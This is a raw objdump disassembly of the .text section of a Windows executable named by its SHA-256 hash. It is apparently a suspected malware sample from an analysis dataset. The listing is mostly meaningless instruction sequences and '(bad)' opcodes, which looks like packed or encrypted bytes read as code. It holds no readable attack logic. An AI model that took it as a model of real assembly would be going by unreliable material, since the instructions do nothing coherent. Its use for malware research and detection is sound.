
2fe301e8acdb743815b8039ca2c6f31c6ca1f8a26e70f6cd12ee78c62363a5f1.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	or     al,0x75
  411002:	(bad)  
  411003:	adc    esp,edi
  411005:	cli    
  411006:	mov    cl,0xcd
  411008:	call   0xd8c:0xdb215fab
  41100f:	mov    al,ds:0x18bd412e
  411014:	xchg   edi,eax
  411015:	test   al,0xf9
  411017:	push   cs
  411018:	cwde   
  411019:	call   0xe82f5e19
  41101e:	xchg   esp,eax
  41101f:	paddd  mm3,mm3
  411022:	jns    0x411079
  411024:	mov    esp,0x8fb263a8
  411029:	mov    esi,0x9969256a
  41102e:	jmp    0x12f:0xdfb10cbe
  411035:	je     0x41100d
  411037:	mov    ah,0xcc
  411039:	sbb    ebp,DWORD PTR [eax]
  41103b:	data16 jecxz 0x41103b
  41103e:	push   ds
  41103f:	repnz push ss
  411041:	xor    bl,BYTE PTR [eax]
  411043:	retf   0x3d73
  411046:	xchg   DWORD PTR [eax],eax
  411048:	xor    al,0x5b
  41104a:	jne    0x411010
  41104c:	push   es
  41104d:	dec    esi
  41104e:	aad    0x84
  411050:	and    edi,DWORD PTR [ebp+0x2f636234]
  411056:	into   
  411057:	mov    edi,0xff211d95
  41105c:	ja     0x411087
  41105e:	daa    
  41105f:	add    al,0x50
  411061:	or     al,BYTE PTR [esi-0x54]
  411064:	fwait
  411065:	sbb    ebx,DWORD PTR [esp+ecx*8+0x2ea47e76]
  41106c:	push   edx
  41106d:	or     eax,0x393bfff5
  411072:	(bad)  
  411073:	lahf   
  411074:	sub    ebp,edi
  411076:	sub    esi,DWORD PTR [edi+0x6a]
  411079:	(bad)  
  41107a:	and    ah,BYTE PTR [ebp-0x7c]
  41107d:	jae    0x4110f4
  41107f:	les    edi,FWORD PTR ds:0x1bda20df
  411085:	add    al,0x3c
  411087:	and    al,0x42
  411089:	cdq    
  41108a:	rcl    ebp,cl
  41108c:	int3   
  41108d:	ror    BYTE PTR [edx+0x75da0339],cl
  411093:	push   ebx
  411094:	jge    0x411037
  411096:	xchg   DWORD PTR [ebx+0x29],ebx
  411099:	adc    dl,0x75
  41109c:	pop    edx
  41109d:	push   DWORD PTR [edi-0x4a]
  4110a0:	lahf   
  4110a1:	cli    
  4110a2:	lods   eax,DWORD PTR ds:[esi]
  4110a3:	push   esi
  4110a4:	dec    ebp
  4110a5:	xor    eax,0x70b8c3f5
  4110aa:	mov    dl,0xc0
  4110ac:	aaa    
  4110ad:	and    eax,0x360bc1b9
  4110b2:	outs   dx,DWORD PTR ds:[esi]
  4110b3:	jns    0x41103d
  4110b5:	call   0x6a9b668a
  4110ba:	es xor eax,0xc92a63c8
  4110c0:	in     al,dx
  4110c1:	ja     0x4110d8
  4110c3:	sahf   
  4110c4:	mov    esp,0x9078c910
  4110c9:	mov    ds:0x620f6e38,al
  4110ce:	aad    0x7e
  4110d0:	xor    eax,0xbb13d24f
  4110d5:	dec    edx
  4110d6:	daa    
  4110d7:	mov    WORD PTR [edx],cs
  4110d9:	(bad)  
  4110da:	push   edx
  4110db:	and    DWORD PTR [ebx+0x63],ecx
  4110de:	iret   
  4110df:	outs   dx,BYTE PTR ds:[esi]
  4110e0:	sbb    eax,0x1a88037b
  4110e5:	addr16 daa 
  4110e7:	imul   BYTE PTR [edi-0x171123d4]
  4110ed:	jge    0x4110c8
  4110ef:	jmp    0x4110be
  4110f1:	les    edx,FWORD PTR [esi+0x2de5e310]
  4110f7:	cld    
  4110f8:	mov    ds:0x518f0b51,al
  4110fd:	(bad)  
  4110fe:	mov    edx,0x41059253
  411103:	xor    eax,0xfa480032
  411108:	xchg   ebp,eax
  411109:	mov    esp,0x3f4603b5
  41110e:	lea    esp,[edx+eax*4]
  411111:	or     ch,ch
  411113:	cwde   
  411114:	pop    ecx
  411115:	jbe    0x4110b3
  411117:	fadd   DWORD PTR ds:[ebx]
  41111a:	push   eax
  41111b:	clc    
  41111c:	pop    ebx
  41111d:	dec    ebp
  41111e:	pop    ebp
  41111f:	jb     0x411189
  411121:	scas   eax,DWORD PTR es:[edi]
  411122:	xchg   esp,eax
  411123:	pop    ds
  411124:	xor    al,0x1a
  411126:	(bad)  
  411127:	jmp    0x4111a7
  411129:	rcl    DWORD PTR [ebx+0x3c],1
  41112c:	push   es
  41112d:	jne    0x4110d3
  41112f:	pop    es
  411130:	pop    edi
  411131:	push   ecx
  411132:	and    bl,BYTE PTR [ecx-0x74]
  411135:	mov    edi,0xf48de5fb
  41113a:	sbb    bh,BYTE PTR [edi+0x2d]
  41113d:	(bad)  
  41113e:	xchg   edi,eax
  41113f:	sbb    eax,DWORD PTR [ebx+0x3a]
  411142:	pushf  
  411143:	dec    ecx
  411144:	div    BYTE PTR [edi]
  411146:	imul   eax,esi,0xf8f83d27
  41114c:	mov    ecx,0x672b5377
  411151:	sub    edx,edx
  411153:	iret   
  411154:	push   ecx
  411155:	test   BYTE PTR [ebp-0x22],ah
  411158:	sub    eax,0x96adaf55
  41115d:	xlat   BYTE PTR ds:[ebx]
  41115e:	pop    ss
  41115f:	imul   eax,DWORD PTR [edx],0xcaa1c926
  411165:	cli    
  411166:	push   ecx
  411167:	ins    DWORD PTR es:[edi],dx
  411168:	sub    ch,BYTE PTR [edi+0xbf9ec8a]
  41116e:	imul   ecx,DWORD PTR [edi-0x1140e29e],0xfffffff9
  411175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411176:	and    DWORD PTR [ecx],ebp
  411178:	rcl    DWORD PTR [eax-0x5e],1
  41117b:	clc    
  41117c:	cmp    bl,ch
  41117e:	xlat   BYTE PTR ds:[ebx]
  41117f:	xor    BYTE PTR [edi+0x6e],bl
  411182:	in     eax,dx
  411183:	adc    eax,0x60e5eeb
  411188:	mov    dh,BYTE PTR [edi]
  41118a:	cs sbb al,0xb7
  41118d:	jp     0x4111b4
  41118f:	inc    ebp
  411190:	mov    dl,0x67
  411192:	pop    edx
  411193:	adc    ah,BYTE PTR cs:[edx]
  411196:	mov    ?,WORD PTR [edx+ebx*4]
  411199:	mov    esi,0x7119dba2
  41119e:	xchg   ebp,eax
  41119f:	sub    ah,BYTE PTR [edx-0x4b]
  4111a2:	retf   
  4111a3:	inc    edx
  4111a4:	mov    ah,0x37
  4111a6:	mov    esp,0x936b2528
  4111ab:	cs or  eax,0x82d4e52b
  4111b1:	test   esi,ecx
  4111b3:	(bad)  [eax-0x7c]
  4111b6:	ret    0xc2eb
  4111b9:	mov    esp,0xfdfc99ee
  4111be:	les    esp,FWORD PTR [edi+edi*4]
  4111c1:	pop    es
  4111c2:	mov    ecx,0x98800857
  4111c7:	push   eax
  4111c8:	lea    esi,[ebx+0x3819b99a]
  4111ce:	xchg   edi,eax
  4111cf:	lods   eax,DWORD PTR ds:[esi]
  4111d0:	xlat   BYTE PTR ds:[ebx]
  4111d1:	lahf   
  4111d2:	adc    edi,edx
  4111d4:	or     ecx,DWORD PTR [ecx-0x3]
  4111d7:	mov    ecx,0x305c10e4
  4111dc:	push   ss
  4111dd:	cmp    DWORD PTR [ebx+0x43fc1c38],esp
  4111e3:	jbe    0x4111da
  4111e5:	or     BYTE PTR [esi+0x15],dl
  4111e8:	js     0x41121c
  4111ea:	fsubr  DWORD PTR [ebp+0x5a]
  4111ed:	cmp    al,0xc4
  4111ef:	lahf   
  4111f0:	xor    DWORD PTR [esi],edx
  4111f2:	aas    
  4111f3:	sahf   
  4111f4:	outs   dx,DWORD PTR ds:[esi]
  4111f5:	add    DWORD PTR [ecx+0x71],ebp
  4111f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111f9:	mov    ch,0xa5
  4111fb:	mov    ebx,0x340c2179
  411200:	jp     0x4111d6
  411202:	or     bh,BYTE PTR [ebp+0x1d181390]
  411208:	aam    0x1a
  41120a:	hlt    
  41120b:	dec    ecx
  41120c:	fsub   st(4),st
  41120e:	lea    edx,[eax+0x76784a36]
  411214:	call   0xe894b831
  411219:	jno    0x411218
  41121b:	popf   
  41121c:	addr16 pop esi
  41121e:	xchg   esp,eax
  41121f:	repz cmp ebx,ecx
  411222:	pop    ds
  411223:	fimul  DWORD PTR [ebx]
  411225:	adc    DWORD PTR [ebx+edi*4+0x37196b2d],ebp
  41122c:	in     eax,0xfa
  41122e:	shl    BYTE PTR [ebx+ebx*4-0x51188869],0x35
  411236:	sub    al,0x27
  411238:	sbb    DWORD PTR [edi-0x3f98a4b3],0xffffff93
  41123f:	ins    DWORD PTR es:[edi],dx
  411240:	xchg   ebp,eax
  411241:	xchg   ebp,eax
  411242:	ja     0x411239
  411244:	pop    esi
  411245:	out    0xea,al
  411247:	das    
  411248:	pop    es
  411249:	rcr    ebp,cl
  41124b:	xor    al,bl
  41124d:	out    dx,eax
  41124e:	xor    al,BYTE PTR [ebp+0x66]
  411251:	aad    0xb1
  411253:	pop    ebx
  411254:	int    0xe3
  411256:	fucomi st,st(5)
  411258:	fidivr DWORD PTR [ecx-0x73]
  41125b:	test   edx,edx
  41125d:	iret   
  41125e:	fist   WORD PTR ds:0x4379bfe9
  411264:	push   edx
  411265:	hlt    
  411266:	call   0x399c820f
  41126b:	call   0xdf71:0x9bb424d4
  411272:	cmp    BYTE PTR [ecx+eiz*4-0x65],al
  411276:	sbb    dl,BYTE PTR [edi-0x2]
  411279:	aam    0xd7
  41127b:	pop    ds
  41127c:	jp     0x411235
  41127e:	js     0x411245
  411280:	into   
  411281:	(bad)  
  411283:	mov    ebx,0xacfc35d8
  411288:	adc    al,0x67
  41128b:	push   ebp
  41128c:	cmp    eax,0x1975e555
  411291:	ins    DWORD PTR es:[edi],dx
  411292:	inc    esi
  411293:	sub    al,dh
  411295:	and    BYTE PTR [edi+0x36],al
  411298:	iret   
  411299:	test   al,0x1c
  41129b:	mov    dh,BYTE PTR [ebx-0x54]
  41129e:	xchg   ebx,eax
  41129f:	loope  0x4112fc
  4112a1:	xchg   ebx,eax
  4112a2:	lock fcmove st,st(6)
  4112a5:	and    eax,DWORD PTR [eax+0x37]
  4112a8:	sbb    ecx,DWORD PTR [eax+ebx*1]
  4112ab:	mov    WORD PTR [ebx+eiz*2-0x19],es
  4112af:	outs   dx,DWORD PTR ds:[esi]
  4112b0:	call   0xd55c:0xcf9b1f2e
  4112b7:	in     eax,0xfa
  4112b9:	dec    ebx
  4112ba:	mov    ebp,DWORD PTR [eax-0x2a]
  4112bd:	jno    0x4112cc
  4112bf:	fcom   st(4)
  4112c1:	push   edx
  4112c2:	jge    0x4112cd
  4112c4:	addr16 cld 
  4112c6:	xchg   ebx,eax
  4112c8:	into   
  4112c9:	dec    eax
  4112ca:	xor    bh,BYTE PTR [edx]
  4112cc:	pop    es
  4112cd:	addr16 sahf 
  4112cf:	mov    es,WORD PTR [ecx-0x199c066]
  4112d5:	pushf  
  4112d6:	mov    ah,0x22
  4112d8:	fbstp  TBYTE PTR [edi]
  4112da:	jmp    0xae7b:0x9685b5c2
  4112e1:	or     al,0xf
  4112e3:	(bad)  
  4112e4:	mov    ah,0x8
  4112e6:	addr16 (bad) 
  4112e8:	cld    
  4112e9:	int3   
  4112ea:	add    ebp,DWORD PTR [edi+ebx*4-0x14]
  4112ee:	push   es
  4112ef:	out    dx,al
  4112f0:	pop    ss
  4112f1:	dec    eax
  4112f2:	sbb    bl,ah
  4112f4:	mov    ebx,0xc0159281
  4112f9:	mov    esp,0x55550651
  4112fe:	inc    edx
  4112ff:	bound  edi,QWORD PTR [esi-0x4f3b13dc]
  411305:	mov    ch,0x18
  411307:	fistp  WORD PTR [edx+0x17dbff99]
  41130d:	ins    BYTE PTR es:[edi],dx
  41130e:	lock arpl WORD PTR [eax-0x2ff28eb0],dx
  411315:	in     eax,dx
  411316:	into   
  411317:	mov    ch,0xe7
  411319:	inc    ebx
  41131a:	push   es
  41131b:	pop    ebp
  41131c:	push   edi
  41131d:	jmp    0x45edebf4
  411322:	xchg   DWORD PTR [ebx+0x39],esi
  411325:	call   0xc4d3d838
  41132a:	in     al,0x69
  41132c:	scas   eax,DWORD PTR es:[edi]
  41132d:	push   edi
  41132e:	mov    dl,0xb3
  411330:	or     ebx,DWORD PTR ds:0x35f2af16
  411336:	stos   DWORD PTR es:[edi],eax
  411337:	pop    ds
  411338:	push   ebp
  411339:	nop
  41133a:	and    ecx,DWORD PTR [edx+0x30f5b16d]
  411340:	xchg   esp,eax
  411341:	outs   dx,BYTE PTR ds:[esi]
  411342:	cmp    BYTE PTR [edi+0x74],ah
  411345:	rcl    BYTE PTR ds:0x6990045a,0xcb
  41134c:	fnclex 
  41134e:	lods   eax,DWORD PTR ds:[esi]
  41134f:	popa   
  411350:	mov    cl,0x63
  411352:	jo     0x4113c5
  411354:	pop    eax
  411355:	lock sbb BYTE PTR [edi],dl
  411358:	stc    
  411359:	leave  
  41135a:	fidiv  DWORD PTR [edi]
  41135c:	jnp    0x41132e
  41135e:	xchg   ebp,eax
  41135f:	sbb    al,0xc5
  411361:	int    0x55
  411363:	cmp    eax,0xe78c06bb
  411368:	aas    
  411369:	xor    BYTE PTR [edx],ch
  41136b:	or     edi,ecx
  41136d:	jnp    0x41130f
  41136f:	sbb    DWORD PTR [esi],eax
  411371:	xchg   DWORD PTR [esi-0x58cc057],edi
  411377:	jne    0x41135c
  411379:	cmp    al,0xf1
  41137b:	xor    bl,0xfd
  41137e:	test   eax,0xb23f7138
  411383:	pusha  
  411384:	cwde   
  411385:	out    dx,eax
  411386:	shl    esi,1
  411388:	xor    BYTE PTR [ebx+0x4a],bl
  41138b:	nop
  41138c:	mov    WORD PTR [esi-0x7a],cs
  41138f:	daa    
  411390:	(bad)  
  411391:	dec    ebx
  411392:	sbb    eax,0xa11861df
  411397:	mov    WORD PTR [ebx-0x70],ds
  41139a:	jne    0x4113f5
  41139c:	mov    al,ds:0x34c211da
  4113a1:	fiadd  DWORD PTR [edi]
  4113a3:	add    DWORD PTR [edx-0x11],eax
  4113a6:	mov    WORD PTR [ebx-0x6dde55b6],es
  4113ac:	fimul  DWORD PTR [edx]
  4113ae:	cmp    bh,cl
  4113b0:	fidiv  WORD PTR [esp+eax*4-0x4079ac48]
  4113b7:	imul   esi,DWORD PTR [ebx],0x9440614a
  4113bd:	ja     0x411413
  4113bf:	add    DWORD PTR [ecx],0xffffffcd
  4113c2:	xchg   DWORD PTR [ebx-0x35],ecx
  4113c5:	xchg   ebp,eax
  4113c6:	ins    DWORD PTR es:[edi],dx
  4113c7:	pusha  
  4113c8:	neg    BYTE PTR ds:0x4b80eaaa
  4113ce:	sub    eax,0x17f55ba8
  4113d3:	clc    
  4113d4:	add    al,0xf1
  4113d6:	push   cs
  4113d7:	add    BYTE PTR [eax],bh
  4113d9:	pusha  
  4113da:	(bad)  
  4113db:	shr    BYTE PTR [ebx+esi*1-0x34],cl
  4113df:	inc    ecx
  4113e0:	stc    
  4113e1:	fidiv  DWORD PTR [edi]
  4113e3:	mov    esp,0xf59b9eac
  4113e8:	xor    al,BYTE PTR [edi+ebx*2+0x3f]
  4113ec:	pop    edi
  4113ed:	pop    esi
  4113ee:	jecxz  0x411450
  4113f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113f1:	mov    dh,0xb8
  4113f3:	inc    ebp
  4113f4:	fsubr  st,st(7)
  4113f6:	xchg   ebp,eax
  4113f7:	call   0xc08e:0xf95cd44d
  4113fe:	mov    WORD PTR [ecx-0x63d26127],ss
  411404:	test   DWORD PTR [edx+0x14],edx
  411407:	pop    esi
  411408:	mov    cl,0x13
  41140a:	daa    
  41140b:	jne    0x411452
  41140d:	test   DWORD PTR [edi-0x60],esp
  411410:	and    DWORD PTR [eax+0x13],esi
  411413:	rol    bl,1
  411415:	xor    ebp,ebx
  411417:	pop    ebx
  411418:	test   eax,0x9a56b444
  41141d:	fs pop ebp
  41141f:	imul   edi,DWORD PTR [ebx-0x77],0x879e5191
  411426:	jp     0x4113fd
  411428:	dec    ebx
  411429:	je     0x411447
  41142b:	xchg   ebp,eax
  41142c:	inc    ecx
  41142d:	in     al,0x48
  41142f:	fisttp QWORD PTR [ebx+0x38]
  411432:	cdq    
  411433:	call   0x2562b3e1
  411438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411439:	dec    edx
  41143a:	adc    DWORD PTR [eax],edx
  41143c:	pushf  
  41143d:	jo     0x41144d
  41143f:	jl     0x41141d
  411441:	adc    DWORD PTR [esi+0x61],ebx
  411444:	inc    esi
  411445:	pop    edi
  411446:	adc    al,0xdd
  411448:	add    BYTE PTR [ecx+ebp*1+0x26ab750e],al
  41144f:	pop    ebx
  411450:	ins    DWORD PTR es:[edi],dx
  411451:	add    DWORD PTR [ecx+0x25f2083a],0xa960f3f1
  41145b:	jle    0x41141c
  41145d:	mov    ds:0xa5de5dad,eax
  411462:	dec    ebp
  411463:	xchg   ebp,eax
  411464:	dec    edi
  411465:	jmp    0x411424
  411467:	inc    ecx
  411468:	ss pop ds
  41146a:	dec    eax
  41146b:	xchg   bl,dh
  41146d:	dec    edi
  41146e:	iret   
  41146f:	stc    
  411470:	push   ds
  411471:	mov    gs,WORD PTR [edi+0x39b013ff]
  411477:	pop    ds
  411478:	leave  
  411479:	or     eax,0xbca98c62
  41147e:	ins    BYTE PTR es:[edi],dx
  41147f:	daa    
  411480:	jl     0x4114db
  411482:	loop   0x4114b5
  411484:	fisttp WORD PTR [esi+0x3bd575af]
  41148a:	stc    
  41148b:	xchg   ebx,eax
  41148c:	pop    ss
  41148d:	push   esp
  41148e:	nop
  41148f:	add    BYTE PTR [edi+0x15],dl
  411492:	pop    esp
  411493:	(bad)  
  411494:	in     eax,0x8b
  411496:	pop    ebp
  411497:	ret    0x5d5
  41149a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41149b:	test   BYTE PTR [ecx],ah
  41149d:	xor    BYTE PTR [esi+esi*2+0x10a83591],dl
  4114a4:	pop    eax
  4114a5:	and    edi,esi
  4114a7:	arpl   WORD PTR [eax],si
  4114a9:	add    cl,dl
  4114ab:	(bad)  
  4114ac:	ficomp WORD PTR [edx+ebx*8-0x564985f3]
  4114b3:	int3   
  4114b4:	jle    0x41145f
  4114b6:	inc    edx
  4114b7:	aad    0xe3
  4114b9:	xchg   DWORD PTR [ebp-0x30af870c],ecx
  4114bf:	add    edx,DWORD PTR [eax+ecx*4-0x58dc3122]
  4114c6:	add    DWORD PTR [eax+0x1c528dd7],ecx
  4114cc:	fld    QWORD PTR [edi]
  4114ce:	sbb    edi,DWORD PTR [ecx+esi*4]
  4114d1:	xor    al,0x19
  4114d3:	pop    eax
  4114d4:	mov    bl,bh
  4114d6:	imul   ecx,DWORD PTR ss:[edi-0x62],0xffffff8e
  4114db:	shl    DWORD PTR [ecx-0x6e],1
  4114de:	dec    edi
  4114df:	or     al,0x5
  4114e1:	dec    ebp
  4114e2:	sbb    dl,BYTE PTR [edx]
  4114e4:	inc    edi
  4114e5:	rol    DWORD PTR [ecx+0x74f0c468],cl
  4114eb:	test   edx,0xac3405fc
  4114f1:	xchg   esp,edx
  4114f3:	inc    ecx
  4114f4:	retf   0xb018
  4114f7:	sub    dh,BYTE PTR [edi+edx*2+0x6a]
  4114fb:	pushf  
  4114fc:	inc    ebp
  4114fd:	aad    0x68
  4114ff:	loopne 0x411481
  411501:	in     eax,0x78
  411503:	ja     0x411550
  411505:	mov    ebp,fs
  411507:	pop    es
  411508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411509:	retf   0x3059
  41150c:	test   BYTE PTR [ebp+edx*2+0x546d13b4],dl
  411513:	xchg   ecx,eax
  411514:	sub    eax,0xd5a05960
  411519:	lea    esp,[edi]
  41151b:	fisttp WORD PTR [esi]
  41151d:	mov    edx,0xa8b5cc1c
  411522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411523:	(bad)  
  411524:	and    al,0xad
  411526:	add    DWORD PTR [ecx],0x68
  411529:	int    0x72
  41152b:	jecxz  0x411596
  41152d:	sbb    BYTE PTR [esi-0x6412da4e],dh
  411533:	das    
  411534:	sub    al,ah
  411536:	nop
  411537:	sbb    DWORD PTR [edx+edi*2+0x45],edi
  41153b:	mov    edx,0x8b60ebbb
  411540:	je     0x4114e9
  411542:	cmp    esp,eax
  411544:	xlat   BYTE PTR ds:[ebx]
  411545:	in     eax,0x56
  411547:	jae    0x411595
  411549:	fild   QWORD PTR [ecx]
  41154b:	(bad)  
  41154d:	loopne 0x411507
  41154f:	inc    ebp
  411550:	(bad)
  411554:	or     ebp,DWORD PTR [ecx-0x67]
  411557:	ds movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41155a:	jle    0x411524
  41155c:	aaa    
  41155d:	sbb    esi,DWORD PTR [esi+0x31]
  411560:	jge    0x41151d
  411562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411563:	sub    al,BYTE PTR [ebp+0x50]
  411566:	or     al,0xad
  411568:	and    BYTE PTR [eax+0x21bc4bea],0xbd
  41156f:	mov    esi,0xa748e889
  411574:	imul   ecx,DWORD PTR [eax-0x43],0x374c773b
  41157b:	cmp    eax,0xce792afd
  411580:	rcr    DWORD PTR [ecx],cl
  411582:	jno    0x4115c3
  411584:	jmp    0x1eac71b9
  411589:	(bad)  
  41158a:	(bad)  
  41158b:	stos   DWORD PTR es:[edi],eax
  41158c:	push   ecx
  41158d:	mov    edx,0xc5b78eb4
  411592:	mov    dl,0x8b
  411594:	repnz and bl,BYTE PTR [edi]
  411597:	xor    BYTE PTR [ebp+0x1b24bbe5],al
  41159d:	jge    0x41158a
  41159f:	scas   al,BYTE PTR es:[edi]
  4115a0:	daa    
  4115a1:	add    BYTE PTR [ebx+0x76],ah
  4115a4:	mov    bh,BYTE PTR [edi]
  4115a6:	mov    dh,0xa5
  4115a8:	out    0x38,eax
  4115aa:	pushf  
  4115ab:	popf   
  4115ac:	(bad)  
  4115ad:	mov    BYTE PTR [ebx],ah
  4115af:	push   ebx
  4115b0:	mov    eax,ds:0xc935e19a
  4115b5:	push   0xf0d0edda
  4115ba:	sar    BYTE PTR [edi-0x3ac812b9],cl
  4115c0:	xchg   ebx,eax
  4115c1:	mov    eax,edi
  4115c3:	or     al,0x9a
  4115c5:	aad    0xc7
  4115c7:	imul   ecx,DWORD PTR [edi],0xe996194e
  4115cd:	jnp    0x411628
  4115cf:	dec    esp
  4115d0:	mul    edx
  4115d2:	sub    eax,0xa3c956c8
  4115d7:	xchg   esp,eax
  4115d8:	stos   DWORD PTR es:[edi],eax
  4115d9:	jnp    0x4115ec
  4115db:	out    0x53,al
  4115dd:	jo     0x4115c6
  4115df:	pop    ebx
  4115e0:	shl    BYTE PTR [edi-0x7f7395fb],0xfb
  4115e7:	cmc    
  4115e8:	sub    BYTE PTR [ecx+0x57],al
  4115eb:	sub    al,0xa1
  4115ed:	rcl    DWORD PTR [ebx+0x7b],0xb0
  4115f1:	xor    edx,DWORD PTR [edx+0x1daf7a00]
  4115f7:	mov    dl,0x86
  4115f9:	mov    DWORD PTR [esi],0x5f5ef6f1
  4115ff:	xlat   BYTE PTR ds:[ebx]
  411600:	in     al,dx
  411601:	ss mov ecx,0x8221d33c
  411607:	idiv   DWORD PTR cs:[edi-0x6f]
  41160b:	adc    DWORD PTR [edi-0x6ed2c12],ebp
  411611:	adc    BYTE PTR [edi+0x48],ah
  411614:	xchg   ecx,eax
  411615:	add    al,0x17
  411617:	icebp  
  411618:	add    ecx,DWORD PTR ds:0x422ed622
  41161e:	sub    DWORD PTR [eax+eiz*4],ebx
  411621:	xlat   BYTE PTR ds:[ebx]
  411622:	add    bh,BYTE PTR [ebx+0xb]
  411625:	jo     0x411605
  411627:	mov    ah,0xc2
  411629:	inc    ebp
  41162a:	dec    eax
  41162b:	aam    0xb3
  41162d:	in     al,dx
  41162e:	add    eax,0x3860c5ae
  411633:	cdq    
  411634:	dec    ecx
  411635:	mov    cl,0xad
  411637:	(bad)  
  411638:	leave  
  411639:	xchg   edi,eax
  41163a:	imul   edx,DWORD PTR [esi+0x49018aa0],0xad7effbd
  411644:	int    0x5d
  411646:	in     al,0x69
  411648:	aaa    
  411649:	ds dec ebp
  41164b:	std    
  41164c:	add    eax,0xc7d680a3
  411651:	int    0xc1
  411653:	leave  
  411654:	jp     0x41162a
  411656:	pop    esi
  411657:	cwde   
  411658:	clts   
  41165a:	popf   
  41165b:	sub    BYTE PTR [eax+0x9],dl
  41165e:	popf   
  41165f:	jg     0x41167c
  411661:	call   0xbad6f1d2
  411666:	adc    BYTE PTR [ecx+0xa],dh
  411669:	clc    
  41166a:	aad    0x98
  41166c:	cli    
  41166d:	sub    ch,al
  41166f:	scas   eax,DWORD PTR es:[edi]
  411670:	sub    dl,BYTE PTR [edx+0x15]
  411673:	fisubr DWORD PTR [edx-0x7c5a7251]
  411679:	lods   eax,DWORD PTR ds:[esi]
  41167a:	mov    dl,0x4b
  41167c:	test   BYTE PTR [ebx],bl
  41167e:	dec    esp
  411680:	stos   DWORD PTR es:[edi],eax
  411681:	call   0xfa4f5f6d
  411686:	sti    
  411687:	leave  
  411688:	in     eax,dx
  411689:	jmp    DWORD PTR fs:[ebp+0x7571f505]
  411690:	push   ds
  411691:	mov    edx,0x59a24f2d
  411696:	sbb    bl,ah
  411698:	lahf   
  411699:	outs   dx,BYTE PTR ds:[esi]
  41169a:	mov    bl,0x8f
  41169c:	into   
  41169d:	scas   al,BYTE PTR es:[edi]
  41169e:	in     al,dx
  41169f:	jl     0x411640
  4116a1:	mov    bl,0x4e
  4116a3:	sar    BYTE PTR ds:0xf5a8c89c,0x61
  4116aa:	fnstcw WORD PTR [eax-0x3389856f]
  4116b0:	cli    
  4116b1:	and    eax,0xc035e1ee
  4116b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116b7:	test   al,0x96
  4116b9:	mov    ebp,0xeca08502
  4116be:	mov    cl,0xee
  4116c0:	popa   
  4116c1:	loope  0x41165e
  4116c3:	inc    ebp
  4116c4:	in     eax,dx
  4116c5:	push   edi
  4116c6:	dec    ebp
  4116c7:	into   
  4116c8:	pusha  
  4116c9:	sbb    eax,0x73a57de2
  4116ce:	push   edi
  4116cf:	call   0x2d943b2
  4116d4:	in     eax,dx
  4116d5:	xlat   BYTE PTR ds:[ebx]
  4116d6:	hlt    
  4116d7:	ret    
  4116d8:	outs   dx,BYTE PTR ds:[esi]
  4116d9:	rcl    dl,1
  4116db:	and    eax,0x47dbbd9
  4116e0:	jnp    0x4116ff
  4116e2:	loope  0x411719
  4116e4:	and    bl,dl
  4116e6:	iret   
  4116e7:	ret    0x9ff5
  4116ea:	stos   DWORD PTR es:[edi],eax
  4116eb:	cwde   
  4116ec:	out    0x23,eax
  4116ee:	fdiv   QWORD PTR [ebx]
  4116f0:	icebp  
  4116f1:	xor    edi,edx
  4116f3:	mov    ecx,0xa3bdb9b0
  4116f8:	jmp    0x69598577
  4116fd:	bound  ebp,QWORD PTR [eax+ebx*2]
  411700:	lods   al,BYTE PTR ds:[esi]
  411701:	(bad)  
  411702:	cmp    eax,0x9d681f29
  411707:	cmp    al,0x2f
  411709:	in     al,0xc4
  41170b:	dec    ebx
  41170c:	hlt    
  41170d:	shl    BYTE PTR [edi-0x1294ed7a],cl
  411713:	mov    esp,DWORD PTR [ebp+0x351f2dac]
  411719:	rcr    DWORD PTR [eax],0x32
  41171c:	je     0x411716
  41171e:	pop    ebx
  41171f:	add    ch,BYTE PTR [edi+0x6e1174de]
  411725:	pushf  
  411726:	mov    BYTE PTR [ebx+0x5f],ah
  411729:	dec    ecx
  41172a:	mov    ebx,0x3bc2f4e4
  41172f:	bound  edi,QWORD PTR [esi+eiz*4]
  411732:	mov    DWORD PTR [esi],0xac7e66f4
  411738:	mov    al,0xa6
  41173a:	gs push ebx
  41173c:	xchg   esi,eax
  41173d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41173e:	cmp    ecx,DWORD PTR [eax+0x2d7ae9cd]
  411744:	push   ds
  411745:	jno    0x411725
  411747:	xor    edi,DWORD PTR [ecx+0x6b57fd77]
  41174d:	outs   dx,DWORD PTR ds:[esi]
  41174e:	inc    eax
  41174f:	mov    bh,dl
  411751:	mov    eax,ds:0x55afccd
  411756:	test   al,0x7e
  411758:	jb     0x41173f
  41175a:	das    
  41175b:	cmp    al,0xcd
  41175d:	adc    al,0xe7
  41175f:	stc    
  411760:	(bad)  
  411761:	push   ebp
  411762:	cmp    esp,DWORD PTR ds:0xf835879b
  411768:	int    0x58
  41176a:	xchg   esi,eax
  41176b:	jae    0x41173d
  41176d:	inc    ebx
  41176e:	in     al,dx
  41176f:	ins    BYTE PTR es:[edi],dx
  411770:	jp     0x41172d
  411772:	and    DWORD PTR [edi],eax
  411774:	(bad)  
  411775:	mov    edi,0x3bd1ec3c
  41177a:	xchg   edi,eax
  41177b:	outs   dx,DWORD PTR ds:[esi]
  41177c:	aam    0xe9
  41177e:	inc    eax
  41177f:	outs   dx,DWORD PTR ds:[esi]
  411780:	hlt    
  411781:	pop    esp
  411782:	push   0xffffffbc
  411784:	inc    ebp
  411785:	test   DWORD PTR [edi-0xc],0xe9442709
  41178c:	xlat   BYTE PTR ds:[ebx]
  41178d:	dec    edx
  41178e:	aas    
  41178f:	js     0x41173c
  411791:	sub    eax,0x3d63e5da
  411796:	jns    0x411722
  411798:	fwait
  411799:	out    dx,al
  41179a:	lock push 0xffffffd1
  41179d:	shr    DWORD PTR [bx+si],0xb9
  4117a1:	mov    edx,0xbc573525
  4117a6:	out    0xa9,al
  4117a8:	dec    edx
  4117a9:	mov    ebp,0xdca9d246
  4117ae:	push   esi
  4117af:	fidiv  WORD PTR [edx+edx*4]
